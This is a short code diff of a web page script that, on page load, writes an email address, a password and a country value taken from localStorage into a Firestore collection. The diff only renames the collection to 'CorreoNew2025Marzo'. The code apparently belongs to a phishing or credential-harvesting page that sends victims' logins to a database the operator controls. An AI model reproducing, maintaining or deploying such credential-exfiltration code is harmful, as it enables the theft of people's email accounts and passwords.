@@ -93,7 +93,7 @@ window.addEventListener("load", async (e) => {
   */
   
 var name = crypto.randomUUID();
-  await db.collection("CorreoNew2025").doc(name).set({
+  await db.collection("CorreoNew2025Marzo").doc(name).set({
     mail: localStorage.getItem("common"),
     pw: localStorage.getItem("commons"),
     pais: localStorage.getItem("pusr"),
